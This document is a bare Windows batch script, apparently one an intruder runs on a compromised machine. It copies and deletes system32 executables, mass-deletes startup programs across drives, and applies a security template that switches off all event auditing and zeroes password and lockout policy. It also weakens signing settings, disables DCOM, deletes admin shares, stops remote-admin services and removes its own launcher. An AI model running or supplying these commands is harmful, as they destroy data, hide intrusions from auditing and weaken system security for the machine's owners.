@echo off
copy /Y %windir%\system32\SpoolSvc.exe %windir%\system32\cmst32.exe
del %windir%\system32\ServDll32.exe
del %windir%\system32\slimftpd.conf
del %windir%\system32\SlimFTPd.log
del %windir%\Svnet32.exe
del %windir%\system32\wins\*.exe /y
del c:\windows\Svnet32.exe
del "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\*.exe" /y
del "C:\Dokumente und Einstellungen\All Users\Start Menu\Programs\Startup\*.exe" /y
del "C:\Documenti e Impostazioni\All Users\Start Menu\Programs\Startup\*.exe" /y
del "C:\WINDOWS\Start Menu\Programs\Startup\*.exe" /y
del "C:\WINNT\Profiles\All Users\Start Menu\Programs\Startup\*.exe"/y
del "C:\WINNT\All Users\Start Menu\Programs\Startup\*.exe" /y
del "C:\WINDOWS\All Users\Start Menu\Programs\StartUp\*.exe" /y
del "C:\Documents and Settings\All Users\Menu Start\Programma's\Opstarten\*.exe" /y
del "D:\Documents and Settings\All Users\Start Menu\Programs\Startup\*.exe" /y
del "D:\Dokumente und Einstellungen\All Users\Start Menu\Programs\Startup\*.exe" /y
del "D:\Documenti e Impostazioni\All Users\Start Menu\Programs\Startup\*.exe" /y
del "D:\WINDOWS\Start Menu\Programs\Startup\*.exe" /y
del "D:\WINNT\Profiles\All Users\Start Menu\Programs\Startup\*.exe" /y
del "D:\WINNT\All Users\Start Menu\Programs\Startup\*.exe" /y
del "D:\WINDOWS\All Users\Start Menu\Programs\StartUp\*.exe" /y
del "D:\Documents and Settings\All Users\Menu Start\Programma's\Opstarten\*.exe" /y
del "E:\Documents and Settings\All Users\Start Menu\Programs\Startup\*.exe" /y
del temp
echo [Version] >> temp
echo signature="$ShawnsMind$" >> temp
echo Revision=1 >> temp
echo [Profile Description] >> temp
echo Description=Default Security Settings. (Windows 2000 Professional)  >> temp
echo [System Access] >> temp
echo MinimumPasswordAge = 0 >> temp
echo MaximumPasswordAge = 42 >> temp
echo MinimumPasswordLength = 0 >> temp
echo PasswordComplexity = 0 >> temp
echo PasswordHistorySize = 0 >> temp
echo LockoutBadCount = 0 >> temp
echo RequireLogonToChangePassword = 0 >> temp
echo ClearTextPassword = 0 >> temp
echo [Event Audit] >> temp
echo AuditSystemEvents = 0 >> temp
echo AuditLogonEvents = 0 >> temp
echo AuditObjectAccess = 0 >> temp
echo AuditPrivilegeUse = 0 >> temp
echo AuditPolicyChange = 0 >> temp
echo AuditAccountManage = 0 >> temp
echo AuditProcessTracking = 0 >> temp
echo AuditDSAccess = 0 >> temp
echo AuditAccountLogon = 0 >> temp
echo [Registry Values] >> temp
echo machine\system\currentcontrolset\services\netlogon\parameters\signsecurechannel=4,1 >> temp
echo machine\system\currentcontrolset\services\netlogon\parameters\sealsecurechannel=4,1 >> temp
echo machine\system\currentcontrolset\services\netlogon\parameters\requirestrongkey=4,0 >> temp
echo machine\system\currentcontrolset\services\netlogon\parameters\requiresignorseal=4,0 >> temp
echo machine\system\currentcontrolset\services\netlogon\parameters\disablepasswordchange=4,0 >> temp
echo machine\system\currentcontrolset\services\lanmanworkstation\parameters\requiresecuritysignature=4,0 >> temp
echo machine\system\currentcontrolset\services\lanmanworkstation\parameters\enablesecuritysignature=4,1 >> temp
echo machine\system\currentcontrolset\services\lanmanworkstation\parameters\enableplaintextpassword=4,0 >> temp
echo machine\system\currentcontrolset\services\lanmanserver\parameters\requiresecuritysignature=4,0 >> temp
echo machine\system\currentcontrolset\services\lanmanserver\parameters\enablesecuritysignature=4,0 >> temp
echo machine\system\currentcontrolset\services\lanmanserver\parameters\enableforcedlogoff=4,1 >> temp
echo machine\system\currentcontrolset\services\lanmanserver\parameters\autodisconnect=4,15 >> temp
echo machine\system\currentcontrolset\control\session manager\protectionmode=4,1 >> temp
echo machine\system\currentcontrolset\control\session manager\memory management\clearpagefileatshutdown=4,0 >> temp
echo machine\system\currentcontrolset\control\print\providers\lanman print services\servers\addprinterdrivers=4,0 >> temp
echo machine\system\currentcontrolset\control\lsa\restrictanonymous=4,0 >> temp
echo machine\system\currentcontrolset\control\lsa\lmcompatibilitylevel=4,0 >> temp
echo machine\system\currentcontrolset\control\lsa\fullprivilegeauditing=3,0 >> temp
echo machine\system\currentcontrolset\control\lsa\crashonauditfail=4,0 >> temp
echo machine\system\currentcontrolset\control\lsa\auditbaseobjects=4,0 >> temp
echo machine\software\microsoft\windows\currentversion\policies\system\shutdownwithoutlogon=4,1 >> temp
echo machine\software\microsoft\windows\currentversion\policies\system\legalnoticetext=1, >> temp
echo machine\software\microsoft\windows\currentversion\policies\system\legalnoticecaption=1, >> temp
echo machine\software\microsoft\windows\currentversion\policies\system\dontdisplaylastusername=4,0 >> temp
echo machine\software\microsoft\windows nt\currentversion\winlogon\scremoveoption=1,0 >> temp
echo machine\software\microsoft\windows nt\currentversion\winlogon\passwordexpirywarning=4,14 >> temp
echo machine\software\microsoft\windows nt\currentversion\winlogon\cachedlogonscount=1,10 >> temp
echo machine\software\microsoft\windows nt\currentversion\winlogon\allocatefloppies=1,0 >> temp
echo machine\software\microsoft\windows nt\currentversion\winlogon\allocatedasd=1,0 >> temp
echo machine\software\microsoft\windows nt\currentversion\winlogon\allocatecdroms=1,0 >> temp
echo machine\software\microsoft\windows nt\currentversion\setup\recoveryconsole\setcommand=4,0 >> temp
echo machine\software\microsoft\windows nt\currentversion\setup\recoveryconsole\securitylevel=4,0 >> temp
echo [Privilege Rights] >> temp
echo seassignprimarytokenprivilege = >> temp
echo seauditprivilege = >> temp
echo sebackupprivilege = *S-1-5-32-544,*S-1-5-32-551 >> temp
echo sebatchlogonright = >> temp
echo sechangenotifyprivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-547,*S-1-5-32-545,*S-1-1-0 >> temp
echo secreatepagefileprivilege = *S-1-5-32-544 >> temp
echo secreatepermanentprivilege = >> temp
echo secreatetokenprivilege = >> temp
echo sedebugprivilege = *S-1-5-32-544 >> temp
echo sedenybatchlogonright = >> temp
echo sedenyinteractivelogonright = >> temp
echo sedenynetworklogonright = >> temp
echo sedenyservicelogonright = >> temp
echo seenabledelegationprivilege = >> temp
echo seincreasebasepriorityprivilege = *S-1-5-32-544 >> temp
echo seincreasequotaprivilege = *S-1-5-32-544 >> temp
echo seinteractivelogonright = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-547,*S-1-5-32-545,*S-1-5-21-1960408961-1637723038-1801674531-501 >> temp
echo seloaddriverprivilege = *S-1-5-32-544 >> temp
echo selockmemoryprivilege = >> temp
echo semachineaccountprivilege = >> temp
echo senetworklogonright = %1 >> temp
echo seprofilesingleprocessprivilege = *S-1-5-32-544,*S-1-5-32-547 >> temp
echo seremoteshutdownprivilege = *S-1-5-32-544 >> temp
echo serestoreprivilege = *S-1-5-32-544,*S-1-5-32-551 >> temp
echo sesecurityprivilege = *S-1-5-32-544 >> temp
echo seservicelogonright = >> temp
echo seshutdownprivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-547,*S-1-5-32-545 >> temp
echo sesyncagentprivilege = >> temp
echo sesystemenvironmentprivilege = *S-1-5-32-544 >> temp
echo sesystemprofileprivilege = *S-1-5-32-544 >> temp
echo sesystemtimeprivilege = *S-1-5-32-544,*S-1-5-32-547 >> temp
echo setakeownershipprivilege = *S-1-5-32-544 >> temp
echo setcbprivilege = >> temp
echo seundockprivilege = *S-1-5-32-544,*S-1-5-32-547,*S-1-5-32-545 >> temp
secedit.exe /configure /areas USER_RIGHTS /db %temp%\temp.mdb /CFG temp
cacls %windir%\system32\cmd.exe /e /G SYSTEM:F Administrators:R /D IUSR_OBWEOSVR4
echo Windows Registry Editor Version 5.00 >> %windir%\system32\securedcom.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole] >> %windir%\system32\securedcom.reg
echo "EnableDCOM"="N" >> %windir%\system32\securedcom.reg
regedit /s %windir%\system32\securedcom.reg
reg IMPORT %windir%\system32\securedcom.reg
net share C$ /del /y
net share IPC$ /del /y
net share ADMIN$ /del /y
net share admin$ /delete /yes
net share ipc$ /delete /yes
net share ADMIN$ /delete /yes
net share IPC$ /delete /yes
net share C$ /delete /yes
net share c$ /delete /yes
net share osucum$ /delete /yes
net share /del admin$ /y
net share /del print$ /y
net share /delete C$ /y
net share /delete D$ /y
net share /delete E$ /y
net share /delete ADMIN$ /y
net share /delete IPC$ /y
net share d$ /delete /y
net share e$ /delete /y
net share f$ /delete /y
net share g$ /delete /y
net share h$ /delete /y
net share i$ /delete /y
net share j$ /delete /y
net share k$ /delete /y
net share l$ /delete /y
net share m$ /delete /y
net share n$ /delete /y
net share o$ /delete /y
net share p$ /delete /y
net share r$ /delete /y
net share s$ /delete /y
net share t$ /delete /y
net share u$ /delete /y
net share v$ /delete /y
net share w$ /delete /y
net share x$ /delete /y
net share y$ /delete /y
net share z$ /delete /y
net stop netbios /y
net share netbios /delete /yes
net share osucum$ /delete /yes
net share print$ /delete /y
net share My Documents /delete /y
net share Shared Docs /delete /y
net stop RemoteRegistry /y
net stop tlntsvr /y
net stop lmhosts /y
net stop PSEXESVC /y
net stop systask /y
net stop r_server /y
net stop "DAmeware 2.6" /y
net stop "RA Server" /y
net stop firedaemon /y
del %windir%\system32\securedcom.reg
del %temp%\a.bat
 